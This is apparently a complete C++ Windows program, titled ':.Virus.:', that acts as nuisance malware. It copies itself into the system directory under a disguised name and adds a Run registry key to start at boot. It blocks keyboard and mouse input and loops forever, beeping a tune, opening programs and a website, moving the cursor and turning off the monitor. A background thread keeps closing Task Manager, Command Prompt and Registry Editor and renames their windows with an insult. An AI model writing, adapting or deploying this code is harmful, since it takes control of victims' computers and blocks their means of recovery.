#include <iostream>
#include <stdio.h>
#include <windows.h>
//#include <winable.h>
#include <conio.h>
#include <ctime>
#define COUNT 60

using namespace std;
int frequency[COUNT] = { /**/293,293,293, 293, 293, 329, 329, 
						/**/349, 349, 349, 349, 349, 392, 392,
						/**/ 293, 440, 392, 466, 440, 349, 392, 440, 466,
						/**/ 440, 293, 
						/**/293, 440, 392, 466, 440, 440, 392, 349, 329, 
						/**/349, 262, 
						/**/293, 440, 392, 466, 440, 349, 392, 440, 466,
						/**/440, 262, 
						/**/ 293, 329, 349, 392, 
						/**/349, 262, 293, 349, 329, 293, 262,    293, 587
																			/**/ };

int longevity[COUNT] = { /**/600,300,600, 300, 600, 600, 600, 
						/**/600, 300, 600, 300, 600, 600, 600,
						/**/ 300, 300, 300, 300, 900, 300, 300, 300, 600,
						/**/ 300, 1800,
						/**/300, 300, 300, 300, 900, 300, 300, 300, 600, 
						/**/300, 1800,	
						/**/300, 300, 300, 300, 900, 300, 300, 300, 600,
						/**/300, 1800,
						/**/ 600, 300, 300, 600,
						/**/300, 1200,300, 300, 300, 300, 600,    2400, 2400 
																			/**/ };

int random, Freq, Dur, X, Y;
HWND mywindow, TaskMgr, CMD, Regedit;
char Notepad[MAX_PATH] = "notepad.exe";
char MineSweeper[MAX_PATH] = "winmine.exe";
char Hearts[MAX_PATH] = "mshearts.exe";
char Website[MAX_PATH] = "http:\\www.google.com";

void SetUp();
void Run(int ID);
void Beeper(), OpenStuff(), Hibernation(), CrazyMouse();
DWORD WINAPI DestroyWindows(LPVOID);
int main()
{
	srand(time(0));
	random = rand() % 6;
	system("title :.Virus.:");
	BlockInput(true);
	SetUp();
	BlockInput(false);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
	while (1)
	{
		Run(random);
		Sleep(10);
	}
}
void SetUp()
{
	char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	HMODULE GetModH = GetModuleHandle(NULL);
	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
	GetSystemDirectory(system, sizeof(system));
	strcat_s(system, "\\winminer.exe");
	CopyFile(pathtofile, system, false);

	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Mcft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "SetUp", 0, REG_SZ, (const unsigned char*)system, sizeof(system));
	RegCloseKey(hKey);

	mywindow = FindWindow(NULL, ":.Virus.:");
	cout << "You Are Doomed cyberot";
	Sleep(1000);
	ShowWindow(mywindow, false);
}

void Run(int ID)
{
	if (ID == 1)
	{
		BlockInput(true);
	}
	else if (ID == 2)
	{
		Beeper();
	}
	else if (ID == 3)
	{
		OpenStuff();
	}
	else if (ID == 4)
	{
		Hibernation();
	}
	else if (ID == 5)
	{
		CrazyMouse();
	}
	else
	{
		BlockInput(true);
		Beeper();
		OpenStuff();
		CrazyMouse();
	}
}

void Beeper()
{
	for (int iFreq = 0; iFreq < COUNT; iFreq++)
	{

		Freq = frequency[iFreq];
		Dur = longevity[iFreq];
		Beep(Freq, Dur);

	}
}
void OpenStuff()
{
	ShellExecute(NULL, "open", Notepad, NULL, NULL, SW_MAXIMIZE);
	ShellExecute(NULL, "open", MineSweeper, NULL, NULL, SW_MAXIMIZE);
	ShellExecute(NULL, "open", Hearts, NULL, NULL, SW_MAXIMIZE);
	ShellExecute(NULL, "open", Website, NULL, NULL, SW_MAXIMIZE);
}
void Hibernation()
{
	Sleep(1000);
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
}
void CrazyMouse()
{
	X = rand() % 801;
	Y = rand() % 601;
	SetCursorPos(X, Y);
}

DWORD WINAPI DestroyWindows(LPVOID)
{
	while (1)
	{
		TaskMgr = FindWindow(NULL, "Windows Task Manager");
		CMD = FindWindow(NULL, "Command Prompt");
		Regedit = FindWindow(NULL, "Registry Editor");
		if (TaskMgr != NULL)
		{
			SetWindowText(TaskMgr, "You Suck Balls Superman");
			PostMessage(TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
		}
		if (CMD != NULL)
		{
			SetWindowText(CMD, "You Suck Balls Superman");
			PostMessage(CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
		}
		if (Regedit != NULL)
		{
			SetWindowText(Regedit, "You Suck Balls Superman");
			PostMessage(Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
		}

		Sleep(10);
	}
}
